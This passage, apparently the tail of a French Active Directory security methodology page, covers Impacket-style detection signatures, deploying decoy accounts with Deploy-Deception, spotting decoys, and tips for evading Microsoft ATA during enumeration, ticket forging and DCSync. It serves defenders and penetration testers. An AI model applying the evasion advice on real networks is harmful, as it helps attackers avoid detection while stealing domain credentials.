- Binds LDAP Kerberos plaçant un `AP-REQ` Kerberos brut directement dans `mechToken` de SPNEGO
- Requêtes de négociation SMB2/3 avec des valeurs `ClientGuid` ressemblant à de l’ASCII
- `IWbemLevel1Login::NTLMLogin` WMI utilisant l’espace de noms non standard `//./root/cimv2`
- Valeurs de nonce Kerberos codées en dur
- **À utiliser plutôt comme fonctionnalités de corrélation/scoring** :
- Listes d’etype Kerberos clairsemées ou dupliquées, `PA-DATA` inhabituels/manquants, ou ordre des etype dans les TGS-REQ différent de celui de Windows natif
- Messages NTLM Type 1 sans informations de version ou messages Type 3 avec des noms d’hôte null
- NTLMSSP brut transporté dans DCE/RPC au lieu de SPNEGO, trailers de vérification DCE/RPC manquants ou incohérences d’OID SPNEGO/Kerberos
- Plusieurs de ces caractéristiques provenant du même hôte/utilisateur/session/fenêtre temporelle sont bien plus révélatrices que n’importe quel champ faible isolé
- **À utiliser comme enrichissement, et non comme alertes autonomes** :
- Noms de fichiers par défaut, chemins de sortie, noms de services aléatoires, noms de batch temporaires, noms de comptes ordinateur par défaut et chaînes HTTP/WebDAV/RDP/MSSQL spécifiques aux outils
- Ces éléments sont faciles à modifier pour les opérateurs et servent surtout à expliquer pourquoi un cluster inter-protocoles est suspect
- **Notes opérationnelles** :
- Certains de ces signaux nécessitent du trafic déchiffré, l’analyse [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou une visibilité côté service
- Valider avec des clients Samba/Linux, des appliances et des logiciels legacy avant de transformer ces éléments en alertes
- Faire progresser les détections de l’enrichissement -> hunting -> alerting à mesure que la confiance dans la baseline augmente

### **Mise en œuvre de techniques de deception**

- La deception consiste à installer des pièges, tels que des utilisateurs ou ordinateurs leurres, avec des caractéristiques comme des mots de passe qui n’expirent jamais ou des comptes marqués comme Trusted for Delegation. Une approche détaillée comprend la création d’utilisateurs avec des droits spécifiques ou leur ajout à des groupes hautement privilégiés.<sup>[[2]](#references)</sup>
- Un exemple pratique consiste à utiliser des outils comme : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d’informations sur le déploiement de techniques de deception sont disponibles sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identification de la deception**

- **Pour les objets utilisateur** : les indicateurs suspects comprennent un ObjectSID atypique, des connexions peu fréquentes, des dates de création inhabituelles et un faible nombre de mots de passe incorrects.
- **Indicateurs généraux** : la comparaison des attributs des objets leurres potentiels avec ceux d’objets authentiques peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier ce type de deception.

### **Contournement des systèmes de détection**

- **Contournement de la détection Microsoft ATA** :
- **Énumération des utilisateurs** : éviter l’énumération des sessions sur les Domain Controllers afin d’empêcher la détection par ATA.
- **Usurpation de tickets** : utiliser des clés **aes** pour la création de tickets aide à échapper à la détection en évitant de rétrograder vers NTLM.
- **Attaques DCSync** : il est conseillé de les exécuter depuis un hôte qui n’est pas un Domain Controller afin d’éviter la détection par ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## References

- [1] [Guide pour attaquer les relations d’approbation de domaine](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forger des relations d’approbation à des fins de deception dans Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin à Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Collection LDAP BOF – Toolkit LDAP en mémoire pour l’exploitation d’Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck ! Transformer des hashes NTLM en wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Analyse d’Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon : prise de contrôle de comptes Active Directory via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Comment gérer les modifications des connexions de canal sécurisé Netlogon associées à CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Voyage au cœur des interfaces Null Session et MS-RPC oubliées](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 4) - Recherche sur le contournement du filtrage SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 5) - Attaque de relation d’approbation Golden GMSA - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Le filtre SID comme frontière de sécurité entre domaines ? (Partie 6) - Attaque de relation d’approbation par modification du schéma - de l’enfant au parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [De DA à EA avec ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Passer des administrateurs d’un domaine enfant aux administrateurs d’entreprise en 5 minutes en abusant d’AD CS, suite](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Un ACE dans la manche : concevoir des backdoors DACL pour Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
